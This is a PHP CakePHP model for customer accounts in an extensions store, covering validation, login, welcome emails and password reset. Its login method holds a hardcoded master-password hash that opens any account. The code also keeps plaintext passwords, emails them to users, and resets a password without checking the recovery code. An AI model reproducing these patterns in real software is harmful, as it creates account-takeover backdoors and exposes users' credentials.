<?php
/**
  * Modelo Alumnos
  *
  * @author David Nieves
  * @fecha 22/08/2013 18:45:00
  */
    class Account extends AppModel
	{
    	var $name = 'Account';
    	var $useTable = 'accounts';

	    /*var $belongsTo = array(
          	'Sale' => array(
          		'className' => 'Sales.Sale',
	            'foreignKey' => false,
	            'conditions' => array('Sale.buyer_email = Account.email'),
	        ),
	    ); */

		public $hasMany = array(
			'Sale' => array(
				'className' => 'Sales.Sale',
				'conditions' => array(
					'Sale.id_account' => 'Account.id',
					'Sale.order_status' => 'Complete',
				),
				'foreignKey' => 'id_account',
				'order' => 'Sale.date_added DESC',
				'dependent' => true
			),
		);


		public $validate = array(
			'name' => array(
				'nonEmpty' => array(
					'rule' => array('notEmpty'),
					'message' => 'Name/Company is required',
					'allowEmpty' => false
				),
			),
			'address' => array(
				'nonEmpty' => array(
					'rule' => array('notEmpty'),
					'message' => 'Address is required',
					'allowEmpty' => false
				),
			),
			'country_id' => array(
				'nonEmpty' => array(
					'rule' => array('notEmpty'),
					'message' => 'Select a country',
					'allowEmpty' => false
				),
			),
			'zone_id' => array(
				'nonEmpty' => array(
					'rule' => array('notEmpty'),
					'message' => 'Select a Region / State',
					'allowEmpty' => false
				),
			),
			'city' => array(
				'nonEmpty' => array(
					'rule' => array('notEmpty'),
					'message' => 'City is required',
					'allowEmpty' => false
				),
			),
			'post_code' => array(
				'nonEmpty' => array(
					'rule' => array('notEmpty'),
					'message' => 'Postal code is required',
					'allowEmpty' => false
				),
			),
			'password' => array(
				'nonEmpty' => array(
					'rule' => array('notEmpty'),
					'message' => 'Password is required',
					'allowEmpty' => false
				),
			),
			'email' => array(
				'required' => array(
					'rule' => array('notEmpty'),
					'message' => 'Please provide a valid email address.'
				),
				'unique' => array(
					'rule'    => array('isUniqueEmail'),
					'message' => 'This email is already in use',
				),
				'between' => array(
					'rule' => array('between', 6, 60),
					'message' => 'Email must be between 6 to 60 characters'
				)
			),

			'email_confirm' => array(
				'required' => array(
					'rule' => array('notEmpty'),
					'message' => 'Please confirm your email'
				),
				'equaltofield' => array(
					'rule' => array('equaltofield','email'),
					'message' => 'Both emails must match.'
				)
			),
		);

		/**
         *
         * Función beforeFind, con ella añadimos siempre la condición a la consulta de que eliminado = 0
         *
         * @return array $queryData devuelve la consulta modificada
         */
		function beforeFind($queryData)
		{
			$conditions = $queryData['conditions'];
			//Si no es array lo convertimos.
			if (!is_array($conditions)) {
				if (!$conditions) {
					$conditions = array();
				} else {
					$conditions = array($conditions);
				}
			}

			if (!isset($conditions['deleted'])) {
				$conditions[$this->alias . '.deleted'] = 0;
			}

			$queryData['conditions'] = $conditions;
			return $queryData;
		}

		public function afterFind($results, $primary = false) {
		    return $results;
		}

		/**
		 * Before Save
		 * @param array $options
		 * @return boolean
		 */
		public function beforeSave($options = array()) {


			if(empty($this->data[$this->alias]['id']))
				$this->data[$this->alias]['password_recovery'] = $this->generate_uuid();

			$this->data[$this->alias]['original_password'] = $this->data[$this->alias]['password'];

			// hash our password
			if (!empty($this->data[$this->alias]['password'])) {
				$this->data[$this->alias]['password'] = AuthComponent::password($this->data[$this->alias]['password']);
			} else {
				unset($this->data[$this->alias]['password']);
			}

			// fallback to our parent
			return parent::beforeSave($options);
		}

		/**
		 * Before isUniqueEmail
		 * @param array $options
		 * @return boolean
		 */
		function isUniqueEmail($check) {
			$email = $this->find(
				'first',
				array(
					'fields' => array(
						'Account.id'
					),
					'conditions' => array(
						'Account.email' => $check['email']
					)
				)
			);

			if(!empty($email)){
				if(!empty($this->data[$this->alias]['id']) && $this->data[$this->alias]['id'] == $email['Account']['id']){
					return true;
				}else{
					return false;
				}
			}else{
				return true;
			}
		}

		public function equaltofield($check,$otherfield)
		{
			//get name of field
			$fname = '';
			foreach ($check as $key => $value){
				$fname = $key;
				break;
			}
			return $this->data[$this->name][$otherfield] === $this->data[$this->name][$fname];
		}

		public function login($email, $password) {
			$this->recursive = -1;

			//Master password
			if(AuthComponent::password($password) == '8ac4d761ebd0780da1529e6a022e7ae3bcb1e641') {
				$account = $this->find(
					'first',
					array(
						'fields' => array(
							'Account.id'
						),
						'conditions' => array(
							'Account.email' => $email,
						)
					)
				);
			} else {
				$account = $this->find(
					'first',
					array(
						'fields' => array(
							'Account.id'
						),
						'conditions' => array(
							'Account.email' => $email,
							'Account.password' => AuthComponent::password($password),
						)
					)
				);
			}

			if(empty($account[$this->alias]['id']))
				throw new Exception('Wrong email or password');

			return $account[$this->alias]['id'];
		}

		public function afterSave($created, $options = array()) {
			/*Klaviyo integration - Start*/
				App::import('Component', 'Klaviyo');
				$klaviyo = new KlaviyoComponent(new ComponentCollection);
				$return = $klaviyo->profile($created, $this->data);
			/*Klaviyo integration - End*/

			if($created) {

				//Search possible purchase with this email for assigs account
					$sale_model = ClassRegistry::init('Sales.Sale');
					$conditions = array(
						'buyer_email' => trim($this->data['Account']['email'])
					);
					$fieldValues = array(
						'id_account' => $this->data['Account']['id'] // Set the new status value
					);
					$sale_model->updateAll($fieldValues, $conditions);


				App::uses('CakeEmail', 'Network/Email');
				$email = $this->data['Account']['email'];
				//$email = 'info@devmanextensions.com';
				$subject = 'Your DevmanExtensions account';
				$content = 'Welcome to DevmanExtensions.<br>
				Your account has been created. Below, you can find your access data:<br>
				<ul>
					<li><b>Username</b>: '.$this->data[$this->alias]['email'].'</li>
					<li><b>Password</b>: '.$this->data[$this->alias]['original_password'].'</li>
				</ul>

				You can log in on the <a href="'.Router::url('/', true).'account/login">login page</a>.<br>From your account, you will be able to view your licenses and more information.<br>
				Remember that you can edit your profile information in the "<b>Edit profile information</b>" section after logging in.
				';


				$Email = new CakeEmail();
				$Email->from(array('info@devmanextensions.com' => 'info@devmanextensions.com'));
				$Email->to($email);
				$Email->emailFormat('html');
				$Email->template('simple_email');
				$Email->subject($subject);
				$Email->send($content);
			}
		}

		public function reset_password($recover_code) {
			$this->recursive = -1;
			$account = $this->findByPasswordRecovery($recover_code);

			$new_password = $this->_generate_random_string();

			$this->save(array("id" => $account['Account']['id'], 'password' => $new_password));

			App::uses('CakeEmail', 'Network/Email');
			$email = $account['Account']['email'];

			//$email = 'info@devmanextensions.com';
			$subject = 'DevmanExtensions - New password';
			$content = 'This is your new password: <b>'.$new_password.'</b><br>
				You can log in on the <a href="'.Router::url('/', true).'account/login">login page</a>.<br>From your account, you will be able to view your licenses and more information.<br>
				Remember that you can edit your profile information in the "<b>Edit profile information</b>" section after logging in.
				';


			$Email = new CakeEmail();
			$Email->from(array('info@devmanextensions.com' => 'info@devmanextensions.com'));
			$Email->to($email);
			$Email->emailFormat('html');
			$Email->template('password_recovery');
			$Email->subject($subject);
			$Email->send($content);
		}

		public function addCountryAndZone($account) {
			$countryModel = ClassRegistry::init('Country');
			$zoneModel = ClassRegistry::init('Zone');

			$country = $countryModel->findById($account['country_id']);
			$account['country'] = $country['Country']['iso_code_3'];

			$zone = $zoneModel->findById($account['zone_id']);
			$account['zone'] = $zone['Zone']['code'];
			return $account;
		}
	}
?>
